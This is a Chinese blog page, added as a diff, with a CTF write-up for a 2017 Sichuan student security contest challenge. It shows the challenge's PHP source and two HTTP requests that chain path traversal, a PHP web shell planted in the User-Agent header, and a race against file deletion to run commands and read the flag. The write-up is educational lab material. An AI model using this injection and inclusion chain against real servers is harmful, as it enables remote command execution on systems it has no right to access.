@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>四川省大学生信息安全线上VulC0d3 WriteUp | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="一道条件竞争的ctf题目。 打开题目就可以看到源码： 123456789101112131415161718192021222324252627282930313233Hello!REMOTE_ADDR: 192.168.200.46HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firef">
+<meta property="og:type" content="article">
+<meta property="og:title" content="四川省大学生信息安全线上VulC0d3 WriteUp">
+<meta property="og:url" content="http://hebic.me/2017/09/19/四川省大学生信息安全线上VulC0d3 WriteUp/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="一道条件竞争的ctf题目。 打开题目就可以看到源码： 123456789101112131415161718192021222324252627282930313233Hello!REMOTE_ADDR: 192.168.200.46HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firef">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-09-26T11:01:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="四川省大学生信息安全线上VulC0d3 WriteUp">
+<meta name="twitter:description" content="一道条件竞争的ctf题目。 打开题目就可以看到源码： 123456789101112131415161718192021222324252627282930313233Hello!REMOTE_ADDR: 192.168.200.46HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firef">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-四川省大学生信息安全线上VulC0d3 WriteUp" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">四川省大学生信息安全线上VulC0d3 WriteUp</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.09.19</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/09/19/四川省大学生信息安全线上VulC0d3 WriteUp/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>一道条件竞争的ctf题目。</p>
+<p>打开题目就可以看到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">REMOTE_ADDR: <span class="number">192.168</span><span class="number">.200</span><span class="number">.46</span></span><br><span class="line">HTTP_USER_AGENT: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">55.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55.0</span></span><br><span class="line">REQUEST_TIME: <span class="number">1505782701</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'ROOT_PATH'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(ROOT_PATH.<span class="string">"/functions.php"</span>);</span><br><span class="line"></span><br><span class="line">$sessionid = <span class="keyword">isset</span>($_GET[<span class="string">'sessionid'</span>])?$_GET[<span class="string">'sessionid'</span>]:<span class="string">''</span>; <span class="comment">//APP调用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($sessionid != <span class="string">''</span>)&#123;</span><br><span class="line">    session_id($sessionid);</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) ? strtolower(trim($_GET[<span class="string">'class'</span>])) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($class == <span class="string">''</span>) &#123;</span><br><span class="line">    header(<span class="string">"location: ./index.php?class=index"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">"/Class/&#123;$class&#125;.class.inc"</span>))</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(ROOT_PATH.<span class="string">"/Class/&#123;$class&#125;.class.inc"</span>);</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> $class();</span><br><span class="line">$obj-&gt;execute();</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>题目默认require /Class/index.class.inc，下载下来读。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $cachefile;</span><br><span class="line">    <span class="keyword">private</span> $logdata;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $sessionid;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cachefile = ROOT_PATH . <span class="string">"/Cache/&#123;$sessionid&#125;.inc"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;cachefile)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;logdata = GetUserLog();</span><br><span class="line">            file_put_contentsfa(<span class="keyword">$this</span>-&gt;cachefile, json_encode(<span class="keyword">$this</span>-&gt;logdata));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;logdata = json_decode(file_get_contents(<span class="keyword">$this</span>-&gt;cachefile), <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Hello!&lt;/b&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;logdata <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&#123;$key&#125;:&lt;/b&gt; "</span> . htmlspecialchars($item) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SaveUserLog(<span class="keyword">$this</span>-&gt;logdata)) &#123; <span class="comment">//将请求日志保存到数据库</span></span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;cachefile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>php逻辑是判断session缓存是否存在，不存在把头部一些信息保存到Cache/$sessionid.inc中，存在读出来。在php结束后删除缓存。期间index.php调用execute读出到首页中。</p>
+<p>思路1：session缓存写到Class文件夹中利用首页的require包含，但是试了各种文件:均没有写权限。</p>
+<p>思路2：session写到Cache文件夹中利用\$sessionid包含Cache文件夹中的缓存。但<code>$sessionid = isset($_GET[&#39;sessionid&#39;])?$_GET[&#39;sessionid&#39;]:&#39;&#39;;</code> 不可以有大写字母，放弃。</p>
+<p>思路3：发现/tmp 文件可写，利用思路一，写入/tmp文件夹，然后包含。</p>
+<p>在inc文件的最后有一行删除文件，要赶在删除文件前运行他。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?class=index&amp;sessionid=../../../../../../tmp/testaaaaaa.class HTTP/1.1</span><br><span class="line">Host: 192.168.5.16</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &apos;§&quot;§&lt;?php system($_GET[1]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=8o2ro21487qmti39vpshr5ji75</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?class=../../../../../../../tmp/testaaaaaa&amp;1=cat+f1aG_30bd87Sjhe6d.php HTTP/1.1</span><br><span class="line">Host: 192.168.5.16</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &apos;§&quot;§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=8o2ro21487qmti39vpshr5ji75</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>用burp的线程跑起来，并在删除之前命令执行。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/08/20/博客搬家小计/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/09/26/ctf之命令执行小总结/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/09/19/四川省大学生信息安全线上VulC0d3 WriteUp/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
